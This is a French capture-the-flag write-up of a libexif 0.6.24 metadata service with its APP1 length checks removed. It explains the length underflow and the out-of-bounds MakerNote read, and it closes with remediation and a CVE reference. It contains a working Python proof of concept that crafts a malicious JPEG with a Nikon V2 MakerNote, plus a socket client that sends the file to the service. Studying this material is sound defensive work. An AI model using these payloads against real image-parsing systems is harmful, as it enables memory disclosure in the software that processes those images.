# VULN#001 — service de métadonnées (libexif, <HOST>:<PORT>)

**Auteur :** lyons

## Statut

Résolu. Le service répond `status: confirmed` suivi du flag ; celui-ci a été remis au joueur pour une soumission manuelle et il est caviardé ici : `CTF{REDACTED}`.

## Cible

- **Service :** `<HOST>:7027` (TCP brut).
- **Description :** « metadata service — The exact source ».
- **Sources fournies :** arbre **libexif 0.6.24** (le service est compilé depuis cette révision).

## Protocole

```
[4-byte big-endian = length N] + [N bytes: the file (JPEG)]
```

Réponses possibles (une seule ligne, sauf en cas de succès) :

| Réponse | Signification |
|---|---|
| `status: not valid` | JPEG invalide (structure cassée, pas de `FFD9`) |
| `status: no effect` | analyse sans erreur, aucune lecture hors bornes |
| `status: insufficient` | lecture OOB refusée par le validateur |
| `status: rate limited, try again later` | limitation de débit |
| `status: confirmed` + `FLAG: CTF{REDACTED}` | bug déclenché, flag renvoyé |

## La vulnérabilité

Dans `exif_data_load_data()`, les deux contrôles de validation exécutés juste après la lecture de la longueur du segment APP1 ont été **supprimés** :

```c
/* present upstream, missing in the provided tree */
if (len > ds) return;   /* APP1 length > available data */
if (len < 2)  return;   /* APP1 length too small     */
```

Sans eux, le calcul suivant sous-déborde :

```c
ds = len - 2;   /* len = 1 => ds = 0xFFFFFFFF, later capped to 0xfffe */
```

La taille *déclarée* du bloc EXIF devient alors bien supérieure à celle du cadre réel. Le détail décisif : `interpret_maker_note(data, d, fullds)` reçoit la valeur **avant** plafonnement (`0xFFFFFFFF`), et non `ds`. Les parseurs de MakerNote (celui d'Olympus, qui prend en charge la variante Nikon V2) valident ensuite leurs offsets internes face à cette taille gigantesque et lisent au-delà du buffer.

De son côté, le validateur du service compare les offsets à `ds` (la taille déclarée) plutôt qu'à la longueur réelle du cadre : un offset « dans les bornes » pour lui est hors bornes pour libexif.

## PoC

Un JPEG minimal (ImageMagick) + un APP1 qui déclare `len = 1` + une MakerNote **Nikon V2** dont l'offset interne vaut `4096` (au-delà du cadre réel d'environ 358 octets, en deçà de `65534`).

```python
import struct, subprocess

J = subprocess.run(["convert", "-size", "8x8", "xc:blue", "jpg:-"],
                   capture_output=True).stdout

def frame(tiff):
    return J[:2] + b"\xff\xe1" + struct.pack(">H", 1) + b"Exif\x00\x00" + tiff + J[2:]

def mk(X):
    # Nikon V2 MakerNote: signature + 3 bytes + TIFF "II" + internal offset (LE32)
    blob = b"Nikon\x00\x02" + b"\x00\x00\x00" + b"II" + b"\x00\x00" + struct.pack("<I", X)
    ifd0    = struct.pack("<H", 1) + struct.pack("<HHI", 0x8769, 4, 1) + struct.pack("<I", 26) + struct.pack("<I", 0)
    exififd = struct.pack("<H", 1) + struct.pack("<HHI", 0x927c, 7, len(blob)) + struct.pack("<I", 44) + struct.pack("<I", 0)
    tiff = b"II*\x00" + struct.pack("<I", 8) + ifd0 + exififd
    tiff = tiff.ljust(44, b"\x00") + blob
    return frame(tiff)

for X in (4096, 32768, 65500):
    open(f"n_{X}.bin", "wb").write(mk(X))
    print("n", X, len(mk(X)))
```

Remarques :

- `0x8769` = pointeur vers la sous-IFD Exif ; `0x927c` = tag **MakerNote** (format 7 = undefined).
- `4096` déclenche le bug (`> frame`, `<= ds`) ; `65500` reste `insufficient` (borne du validateur).

## Envoi

```python
import socket, time

HOST, PORT = "<HOST>", 7027

def query(path, tries=8, gap=25):
    data = open(path, "rb").read()
    msg = len(data).to_bytes(4, "big") + data
    for _ in range(tries):
        s = socket.create_connection((HOST, PORT), timeout=8)
        s.settimeout(6)
        s.sendall(msg)
        out = b""
        while True:
            try:
                c = s.recv(8192)
            except socket.timeout:
                break
            if not c:
                break
            out += c
        s.close()
        if b"rate limited" in out:
            time.sleep(gap)
            continue
        return out
    return None

print(query("n_4096.bin"))
```

## Résultat

```
status: confirmed
FLAG: CTF{REDACTED}
```

## Analogie

Imaginez un douanier qui contrôle vos bagages. Vous lui tendez un passeport dont la validité est déclarée « 1 page » alors qu'il devrait être refusé d'emblée — mais il inscrit « validité : quasi infinie » (un sous-débordement). Vous avez glissé dans le passeport un mot interne (la MakerNote Nikon V2) demandant « allez consulter la page 4096 ». Le douanier suit ce pointeur, alors qu'il désigne une page bien au-delà du vrai passeport, et tombe sur le document confidentiel (le flag).

## Remédiation

- Rétablir les deux vérifications après la lecture de la longueur APP1 :

```c
if (len > ds) return;
if (len < 2)  return;
```

- Valider les offsets internes (MakerNote, sous-IFDs) par rapport à la **taille réelle du buffer**, jamais par rapport à la taille déclarée.
- Transmettre aux parseurs de MakerNote la valeur plafonnée (`ds`) — et non `fullds`.
- Fuzzer/analyser sous ASan/UBSan : le bug se manifeste aussitôt (`heap-buffer-overflow` au cœur du parseur Olympus).

## Références

- CVE-2012-2836 (sous-débordement de la longueur APP1 dans libexif).
- Source corrigée : `challenges/vuln001/libexif/exif-data.c` ; référence upstream : `challenges/vuln001/upstream/`.
